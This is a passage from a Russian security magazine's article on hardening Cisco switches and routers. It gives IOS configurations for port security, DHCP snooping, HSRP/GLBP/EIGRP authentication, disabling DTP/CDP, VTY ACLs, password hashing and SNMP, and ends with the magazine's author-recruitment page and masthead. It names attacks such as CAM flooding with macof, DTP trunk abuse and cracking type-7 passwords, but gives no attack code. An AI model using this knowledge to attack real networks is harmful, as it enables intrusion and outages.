ра, внутри которой хранит ся таб лица MAC-адресов и свя занных с ними пор-
тов. Это несложный механизм, однако уже очень давно существует хулиган-
ский вектор DoS-ата ки, при которой ата кующий переполняет CAM-таб лицу
с помощью рассылки Ethernet-кадров с рандомизирующимися MAC-адре-
сами источни ка, что перебивает ком мутаци онную матрицу. Очень извес тный
при ем, но не упо мянуть о нем я не могу.
  Защитить CAM-таб лицы своих ком мутаторов очень просто, дос таточно
использовать Port Security. В нашем случае эта нас трой ка подходит для огра-
ниче ния количества MAC-адресов за портом коммутато ра. Допустим, если
нас троим ограничение в 20 MAC-адре сов на пор те, а атакующий начнет
в эфире флуд (каким-нибудь macof), то к порту будут уже при меняться огра-
ниче ния — в зависимости от настроенной политики.
   Вот при мер кон фигурации, при которой ста вится ограниче ние в два MAC-
адреса, а при наруше нии это го ограничения порт будет выключен.


SaveMe(config)# interface range gX/X
SaveMe(config-if)# switchport port-security maximum <value>
SaveMe(config-if)# switchport port-security violation shutdown

При такой конфигурации в момент наруше ния политики MAC-адре сов порт
будет переве ден в состояние err-disabled. Что бы нас троить автоматичес-
кое восстановление порта из это го состояния, понадобит ся еще одна коман-
да:


SaveMe(config)# errdisable recovery interval 120
SaveMe(config)# errdisable recovery cause psecure-violation


ÇÀÙÈÒÀ DHCP-ÑÅÐÂÅÐÀ ÎÒ ÀÒÀÊ ÈÑÒÎÙÅÍÈß

DHCP Exhaustion — это сетевая атака, позволяющая вызвать у DHCP-сервера
отказ в обслуживании. Атакующий выпол няет рас сылку лож ных сооб щений
DHCPDISCOVER с ран домны ми MAC-адре сами источника, вынуждая DHCP-
сервер отвечать на каждый такой DISCOVER и выдавать ему адрес.
  Во обще, для защиты DHCP-сервера есть технология DHCP Snooping,
разоб ранная в пре дыдущей версии статьи. Мы тогда разоб рали кон цепцию
защиты именно от появления ложного DHCP-сервера, а сейчас поговорим
про митига цию ата ки истощения адресно го пространства.
  DHCP Snooping так же позволяет нас троить Limit Rate: это параметр, отве-
чающий за ограничение количес тва DHCP-сооб щений на пор те коммутатора.
Обыч но этот Limit Rate настраивается имен но на портах дос тупа, куда под-
ключают ся конечные станции. Сами инже неры Cisco рекомендуют исполь-
зовать ограниче ние не более 100 пакетов в секун ду, однако тут уже стоит
отталкиваться от осо бенностей своей инфраструк туры и подбирать значение
вруч ную. Делай это аккурат но, чтобы случайно не срезать легитимный тра-
фик.


SaveMe(config)# interface range f0/X-XX
SaveMe(config-if)# ip dhcp snooping limit rate <count>

Также сто ит вклю чить опцию про верки MAC-адреса в кадрах внутри DHCP-
пакетов:


SaveMe(config)# ip dhcp snooping verify mac-address

Ес ли на пор те окажет ся больше DHCP-мес седжей, он просто упа дет в сос-
тояние ERR-DISABLED, будет заб локирован на логическом уровне и админис-
тратору придется самому поднимать его из этого состояния. Одна ко Cisco
IOS предлагает авто матичес кое вос становление работы порта, если его заб-
локировал какой-нибудь механизм защиты. Вот пример команды для авто-
мати ческого вос становления порта пос ле сра батывания Limit Rate при DHCP
Snooping:


SaveMe(config)# errdisable recovery cause dhcp-rate-limit

Еще обычно настраивают таймер и зада ют время, через которое порт вер-
нется из состояния ERR-DISABLED. Тут отталкивайся от инфраструктуры и сво-
его видения:


SaveMe(config)# errdisable recovery interval <seconds>


ÄÎÌÅÍÛ ÎÒÊÀÇÎÓÑÒÎÉ×ÈÂÎÑÒÈ HSRP & GLBP

Это проприетарные протоколы Cisco, предназна ченные для резервирования
шлюзов. Домены HSRP/GLBP могут подвергнуться атакам спуфинга, и ты
к ним должен быть готов. Есть два метода защиты.
  Ïåðâûé ìåòîä — выставить максималь ный при оритет 255. Если в сети
уже существует ACTIVE/AVG-спикер с максимальным значением приори тета,
то инъекции атакующе го будут бесполезны и он не сможет перехватить эти
роли для последующей MITM-атаки.
  HSRP (Master-спикер):


SaveMe(config-if)# standby <group_number> priority 255

GLBP (для AVG-спи кера отталкивай ся от особенностей работы протоко ла
GLBP, там всё сложнее по сравнению с HSRP):


SaveMe(config-if)# glbp <group_number> priority 255

Âòî ðîé ìåòîä —  использовать  криптогра фическую  аутентификацию.
Выбери стойкую пароль ную фразу для защиты HSRP/GLBP-доменов, чтобы
компьютер атакующе го не смог вме шать ся в домен отказоустойчивос ти.
К этой про цедуре нужно отнестись серь езно, так как атакующий способен
прос лушать пакеты этих протоколов, выдернуть криптогра фический хеш
и сбрутить пароль. Ты не должен это го допус тить. Вот как настраивается
аутентификация для этих протоколов.
  HSRP:


SaveMe(config-if)# standby <group_number> authentication md5 key-
string <PHRASE>

GLBP:


SaveMe(config-if)# glbp <group_number> authentication md5 key-string
<PHRASE>

Кста ти говоря, оборудо вание Cisco может похвастаться наличием Keychain-
аутентификации. Эта настрой ка позволя ет соз дать цепочку из нескольких
ключей и даже настро ить специальные времен ные промежутки, в рамках
которых ключи будут тран слироваться между спи кера ми. Будь то домен отка-
зоустойчивости или домен динамичес кой мар шру тизации. Использование
Keychain-аутентификации усложняет жизнь ата кующе му в нес коль ко раз, ведь
необходимо сбрутить все ключи, угадать их порядок и тайминги.
   Вот при мер нас тройки Keychain:


SaveMe(config)# key chain SaveMe
SaveMe(config-keychain)# key 1
SaveMe(config-keychain-key)# key-string <PHRASE>
SaveMe(config-keychain)# key 2
SaveMe(config-keychain-key)# key-string <PHRASE>

По лучилась цепоч ка из двух клю чей. Ты можешь применить ее, например,
для домена отказоустой чивости GLBP или для домена маршру тизации EIGRP.
Продемонстри рую два при мера. Вмес те с цепоч кой ключей будем исполь-
зовать MD5.
  Настрой ка для защиты домена отказоустойчивос ти GLBP:


SaveMe(config-if)# glbp <group_number> authentication md5 key-chain
SaveMe

Настройка для защиты домена маршру тизации EIGRP:


SaveMe(config-if)# ip authentication mode eigrp <ASN> md5
SaveMe(config-if)# ip authentication key-chain eigrp <ASN> SaveMe

SaveMe в конце команды — это наз вание созданной цепочки, не перепутай.
   Та ким образом мы можем защитить домены отка зоустойчивости и домены
маршрутизации, реали зованные на протоколах Cisco. Для EIGRP, кстати,
не будет лишним исполь зовать пассивные интерфей сы. Они запрещают рас-
сылку пакетов при ветствия Hello на интерфейсах внутри сети, что лишает ата-
кующего всех шансов воздей ствовать на домен маршру тиза ции.


SaveMe(config)# router eigrp <ASN>
SaveMe(config-router)# passive-interface <interface>


ÎÒÊËÞ×ÅÍÈÅ DP

DP (Discovery Protocols) — протоколы, предназначенные для автомати ческого
обмена служеб ной информа ции меж ду сетевы ми устрой ствами. Это облегча-
ет  сетевому инже неру  процесс  траб лшу тинга. Но  бывают  настройки,
при которых рассылка протоко лов DP (CDP/LLDP) происхо дит во все сетевые
интерфейсы устройства. Внутренний нарушитель при анализе трафика может
перехватить эти пакеты и узнать достаточно чувс твительную информацию
об устройстве: версию про шивки, тип модели, адресацию и прочее.
  Ре комен дуется выключать DP-про токо лы на портах конечных станций.
Однако если в сег менте есть IP-телефо ния, необходимо с осторожность вык-
лючать протоко лы на этих портах, так как DP также используются для работы
IP-телефо нии (VoIP):


SaveMe(config)# interface range fX/-XX
SaveMe(config-if)# no cdp enable
SaveMe(config-if)# no lldp receive
SaveMe(config-if)# no lldp transmit


ÂÛÊËÞ×ÅÍÈÅ DTP È ÑÌÅÍÀ NVLAN

DTP — это, на мой взгляд, рак коммутато ров Cisco. Бесполезный протокол,
предлагающий авто мати ческую систему транкинга, которая ухудшает дизайн
сети. Сеть в результате ста новится менее предсказуемой. Сетевой инженер
сам должен решать, где должен быть транк-порт, и явно его настраивать.
  Использование это го протокола ставит под удар безопасность сегмента,
потому что если администратор прозевает наличие дефолтных пор тов ком-
мутато ров Cisco (которые еще и включены по умолчанию), то атакующий
может под клю чить ся к ком мутатору, отправить кадр DTP Desirable и тем
самым обойти VLAN-сегмента цию на ком мутаторе.
   Также стоит упомянуть о специфи чес ком векторе атаки Double Tagging.
Для современных инфраструктур эта атака ско рее теоре тическая и работает,
если при сутствует дефолтный Native VLAN 1. Поэтому всегда стоит менять
зна чение Native VLAN (NVLAN) на любое другое. Кстати говоря, Native VLAN —
это специальный VLAN, куда падает нетегирован ный трафик.
   Чтобы вык лючить DTP, нужно в первую очередь перевес ти порты ком-
мутато ра в режим доступа, а также выключить сам DTP:


SaveMe(config)# interface range g0/X-XX
SaveMe(config-if)# switchport mode access
SaveMe(config-if)# switchport nonegotiate

Также рекомендует ся провести энумерацию неиспользуемых портов ком-
мутато ра, соз дать для них специальный VLAN, а-ля «VLAN Shutdown 666»,
и переместить их туда, а затем перевести в вык люченное сос тояние. Таким
образом  уменьшится  вероятность  несанкционированного  подключения
в сеть.


SaveMe(config)# vlan 666
SaveMe(config-vlan)# name Shutdown
SaveMe(config)# interface range g0/X-XX
SaveMe(config-if)# switchport mode access
SaveMe(config-if)# switchport access vlan 666


ÐÈÑÊÈ ÏÐÈ ÈÍÒÅÃÐÀÖÈÈ ÈÑÏÎËÜÇÎÂÀÍÍÛÕ ÐÀÍÅÅ
ÊÎÌÌÓÒÀÒÎÐÎÂ CISCO

Ес ли тебе нужно установить ранее использован ный коммутатор Cisco в дру-
гую сеть, обязатель но проверь состояние VTP на этом устрой стве. VTP поз-
воля ет централизованно управлять базой дан ных VLAN, и актуальность этой
базы отсле жива ется по номеру ревизии. Если получится так, что на старом
ком мутато ре Cisco номер ревизии VTP больше, то кадр с номером ревизии
может распространиться по тран ковым каналам (а на ком мутаторе могут быть
другие сети VLAN). Из-за этого текущие коммутато ры обновят свои БД VLAN,
и может воз никнуть сетевой паралич.
   Всег да про веряй настрой ки VTP на ста ром обо рудовании, которое хочешь
поместить в сеть. Ты можешь сбросить номер ревизии, если изме нишь имя
VTP-домена на любое другое и пос тавишь тре буемое.


SaveMe(config)# vtp mode client
SaveMe(config)# vtp domain shadjfkshdfjaks
SaveMe(config)# vtp domain <necessary vtp domain name>

Также можешь перек лючить ком мутаторы в режим VTP Transparent, они
не участвуют в процессах VTP.


SaveMe(config)# vtp mode transparent


ÁÅÇÎÏÀÑÍÎÑÒÜ ËÈÍÈÈ VTY

Терминаль ные линии VTY поз воляют подключаться к сетевому оборудованию
удаленно (SSH/Winbox/HTTP/API). Одна ко бывает, что VTY не защище ны
с помощью ACL, поз воляющих фильтровать подключения  к VTY только
из опре деленных Management-подсетей, которые исполь зуют админис тра-
торы для управления обо рудованием.
   Хо рошая практика — использовать концепцию fail2ban внутри инфраструк-
туры. Вдруг один из админских компь ютеров будет заражен трояном, который
най дет служ бы SSH/HTTP на обо рудовании и начнет брутфорсить их? Также
на службах SSH желательно использовать аутен тифика ции по ключу и зап рет
входа по паролю.
   Вот при мер прос того ACL, который защищает линии VTY и разрешает под-
ключение толь ко из указанной подсети:


SaveMe(config)# access-list 10 permit <subnet> 0.0.0.255
SaveMe(config)# access-list 10 deny any log
SaveMe(config)# line vty 0 15
SaveMe(config-line)# access-class 10 in

Строка access-class 10 in при вязывает этот ACL к линиям 0–15.


ÏÀÐÎËÈ CISCO IOS

У Cisco IOS есть проблемы с безопасностью хранения паролей внутри опе-
раци онной системы. Не рекомендуется использовать типы паролей 4, 5 и 7,
так как они подразумевают шифрование SHA-256, MD5 и Vigenere Cipher
соот ветственно.  Брут форс  таких паролей не составля ет  труда, а  для
типа 7 нужен прос то дешифратор ciscot7.
   Луч шая практика — использовать TYPE 8, TYPE 9 (PBKDF2, SCRYPT),
а также AAA (Authentication, Authorization, Accounting) для централизован ного
управле ния учетными записями (RADIUS or TACACS+).
  На при мере TYPE 8:


SaveMe(config)# enable algorithm-type sha256 secret <password>
SaveMe(config)# username motor algorithm-type sha256 secret <
password>




                   В TYPE 8 используются SHA-256, 80-битная соль
                      и 20 000 ите раций, что дела ет этот тип хеширо-
                       вания  дос таточ но  безопас ным  для  защиты
                        паролей. Сбру тить их будет очень сложно.



ÁÅÇÎÏÀÑÍÎÑÒÜ ÏÐÈ ÐÀÁÎÒÅ Ñ SNMP

Ес ли ата кующий сбру тит строку SNMP RW, то это позволит ему прочитать нас-
тройки с маршрутизатора и узнать край не чувс твительную информацию
об инфраструктуре  (IP-адресация,  кон фигурация интерфейсов,  учетные
записи и пароли в хеширо ванном виде). С этой информацией у ата кующего
есть все шансы проникнуть внутрь инфраструктуры и продолжить прод-
вижение по сети.
   Есть два варианта решения этой проблемы:
 1. Установить стой кую RW-фразу, которую будет край не тяжело сбрутить.
 2. Ограничить сетевой дос туп к UDP/161 путем нас тройки ACL-листов. Пусть
   этот порт участвует только во взаимо действии с легитимным SNMP-сер-
   вером.

Настройка новой RW-строки:


SaveMe(config)# snmp-server community <string> RW




                    Перед настройкой RW-стро ки обязательно про-
                       веряй  связность между оборудованием  Cisco
                      и SNMP-сервером.


И второе решение — использование ACL. Вот пример такого ACL, здесь раз-
решается только один адрес (адрес самого SNMP-сервера). Адаптируй этот
метод под свой маршру тизатор, где наверняка  есть ACL,  так  как на
интерфейс роутера мож но установить только один ACL-лист.


access-list 101 permit udp host <snmp_server_ip> any eq 161
access-list 101 permit udp host <snmp_server_ip> any eq 162
access-list 101 deny udp any any eq 161
access-list 101 deny udp any any eq 162
access-list 101 permit ip any any


ÎÑÒÎÐÎÆÍÎÑÒÜ ÏÐÈ ÔÈËÜÒÐÀÖÈÈ ICMP

Бло киро вать ICMP в сетевой инфраструктуре — гру бая ошибка. Во-пер вых,
из-за это го про падет воз можность про водить диаг ностику: пинги и traceroute
работать не будут. Во-вто рых, система PMTUD перестанет работать, так
как сущес твует за счет работы ICMP Type 3. Благодаря PMTUD можно избе-
жать избы точной фраг мента ции, а это, в свою очередь, вли яет на скорость
передачи данных.
  Фильтруй ICMP грамот но, отсекай только ненужные тебе типы.


NO FULL CONE NAT

NAT в сетях настраивают час то, однако тут есть несколько подвидов настроек:
Full Cone, Symmetric, Restricted и Port Restricted. Мы остановимся на первом
вари анте, так как он вызывает больше все го проблем с безопас ностью.
  При Full Cone NAT входящие пакеты от любого внешнего хоста будут
перенаправляться соответствующему хос ту в локальной сети, если в таб лице
NAT присутс твует соот ветс тву ющая запись. Более того, номер порта источни-
ка в этом случае не имеет зна чения — он может быть и 53, и 54, и вообще
каким угодно, в этом виде NAT проверя ется толь ко порт назначения, адрес
наз начения и L4-протокол.
   Если ата кующий будет находиться за NAT, он смо жет проник нуть внутрь
инфраструк туры благодаря обычным статичес ким маршрутам сквозь пог-
раничный роутер, так как из-за осо бенностей Full Cone NAT его трафик будет
маршрутизирован внутрь.


NO PORT FORWARD

Проброс портов на первый взгляд кажет ся очень удобным решени ем, если
нуж но  быстро  организо вать  устрой ству  доступ  в  интернет.  Однако
это негатив но сказывается на безопасности сети, так как проб рошенный порт
лег ко обнаружить, учи тывая скорость сов ременных порт-сканеров. Если
такое устройство будет взло мано, то атакующий сможет провести пивотинг
внутрь инфраструктуры и эска лировать свое при сутствие в скомпромети-
рованной сети.
  Ре комен дуется отказать ся от проб роса пор тов и вместо этого исполь-
зовать VPN-сервер.


ÇÀÙÈÒÀ ÎÒ UPNP-ÈÍÚÅÊÖÈÉ

UPnP (Universal Plug and Play) — груп па протоколов, которые позволяют
компьюте рам с помощью специаль ных запросов получать доступ в интернет.
Исполь зование UPnP — небезопасная практика, поскольку атакующий может
най ти порт UPnP и с помощью специальных запросов открыть для себя дос-
туп к хостам за пограничным мар шру тизатором (нап ример, через Metasploit
Framework).
  Ре комен дую отклю чить UPnP на сетевом обо рудовании во избе жание рис-
ка взло ма внеш него периметра.


ÂÛÂÎÄÛ

Несмотря на то что я сделал акцент на Cisco IOS, все эти механиз мы защиты
реали зованы у большинства вендоров сетевого обо рудования. Применяй эти
тех ники у себя, но будь осто рожен: с настройками безопасности часто есть
шанс «выстре лить себе в ногу» и нарушить нормаль ную работу сети.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №12 (297)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                      Ев гения Шарипова           yambuto
                        Литературный редактор         Бильд-редак тор
                                                   yambuto@gmail.com


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Учредитель: ИП Яков лева Анна Вадимов на ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Москов ская область,
Пушкино, мкр Соф рино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегис трирова но Федераль ной службой по надзору в сфере связи,
информа цион ных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обя зательно совпадает с мнением авторов. Все матери алы в номере предоставля ются как информа ция к раз мышлению. Лица,
использующие данную информа цию в про тиво законных целях, могут быть прив лечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024